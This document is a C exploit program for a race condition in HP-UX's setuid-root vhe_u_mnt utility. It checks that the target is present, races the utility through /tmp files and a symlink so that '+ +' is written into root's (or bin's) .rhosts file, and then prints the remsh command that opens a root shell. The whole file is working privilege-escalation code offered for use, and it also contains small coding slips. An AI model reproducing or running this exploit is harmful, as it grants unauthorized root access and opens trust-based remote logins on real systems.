/***
 *
 * HP-UX /usr/etc/vhe/vhe_u_mnt bug exploit.
 *
 * This bug is exhibited in all versions of HP-UX that contain
 * /usr/etc/vhe/vhe_u_mnt setuid to root.
 *
 * This program written by pluvius@io.org
 * The exploit code itself written by misar@rbg.informatik.th-darmstadt.de
 *
 * I found that the exploit code didn't always work due to a race between
 * the child and the parent, and that a link() called failed due to
 * the fact that user directories and the /tmp are in different file systems
 * so you must create a symlink.
 * I added in a call to alarm() so that the timing between the two processes
 * is ok..
 *
 ***/
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#define BUGGY_PROG "/usr/etc/vhe/vhe_u_mnt"
#define NAME "<defunct>"

int test_host()
{ struct utsname name;
   uname(&name);
   return !strcmp(name.sysname,"HP-UX");
}
int check_mount()
{ struct stat my_buf;
   if (stat(BUGGY_PROG, &my_buf))
      return 0;
   return !((my_buf.st_mode & S_ISUID) != S_ISUID);
}
void pause_handler()
{
   signal(SIGALRM,pause_handler);
}
int rhost_user(user)
char *user;
{
  struct passwd *info;
  char   homedir[80];
  int fd[2];
  int procno;
  struct stat my_buf;
  int fsize;

   info = getpwnam(user);
   if (info==NULL) {
      fprintf(stderr,"ERROR: Unknown user %s\n",user);
      exit(-3);
   }
   strcpy(homedir,info->pw_dir);
   if (homedir[strlen(homedir)-1] != '/')
      strcat(homedir,"/");
   strcat(homedir,".rhosts");

   signal(SIGALRM,pause_handler);
   memset(my_buf,0,sizeof(my_buf));
   stat(homedir,&my_buf);
   fsize = my_buf.st_size;

   /* now the exploit code... slightly modified.. but mostly from the source */
   /* by misar@rbg.informatik.th-darmstadt.de                                */
   pipe(fd);
   if (!(procno=fork())) {
      close(0);
      dup(fd[0]);
      close(fd[1]);
      close(1);
      close(2);
      alarm(2); /* wait for other process */
      nice(5);
      execl(BUGGY_PROG,NAME,NULL);
   } else {
    FILE *out;
    char listfile[25];
    char mntfile[25];
    struct stat dummy;

      close(1);
      dup(fd[1]);
      close(fd[0]);
      write(1,"+\n",2);
      sprintf(listfile,"/tmp/vhe_%d",procno+2);
      sprintf(mntfile,"/tmp/newmnt%d",procno+2);
      while (stat(listfile,&dummy));
      unlink(listfile);
      out=fopen(listfile,"w");
      fputs("+ +\n",out);
      fclose(out);
      unlink(mntfile);
      symlink(homedir,mntfile);
      waitpid(procno,NULL,0);
   }
   stat(homedir,&my_buf);
   return (fsize != my_buf.st_size);
}

void main(argc,argv)
int   argc;
char *argv[];
{
  int i;
  int rhost_root = 0;
  char userid[10];

   if (!test_host()) {
      fprintf(stderr,"ERROR: This bug is only exhibited by HP-UX\n");
      exit(-1);
   }

   if (!check_mount()) {
      fprintf(stderr,
              "ERROR: %s must exist and be setuid root to exploit this bug\n",
              BUGGY_PROG);
      exit(-2);
   }

   for (i=0;(i<5)&&(!rhost_root);i++) {
      fprintf(stderr,"Attempting to .rhosts user root..");
      if (!rhost_user("root")) {
         fprintf(stderr,"failed.\n");
      } else {
         fprintf(stderr,"succeeded\n");
         rhost_root = 1;
      }
   }

   if (!rhost_root) {
      /* failed to rhost root, try user 'bin' */
      fprintf(stderr,"Too many failures.. trying user bin...");
      if (!rhost_user("bin")) {
         fprintf(stderr,"failed.\n");
         exit(-4);
      }
      fprintf(stderr,"succeeded.\n");
      strcpy(userid,"bin");
   } {
      strcpy(userid,"root");
   }
   fprintf(stderr,"now type: \"remsh localhost -l %s csh -i\" to login\n",
           userid);
}

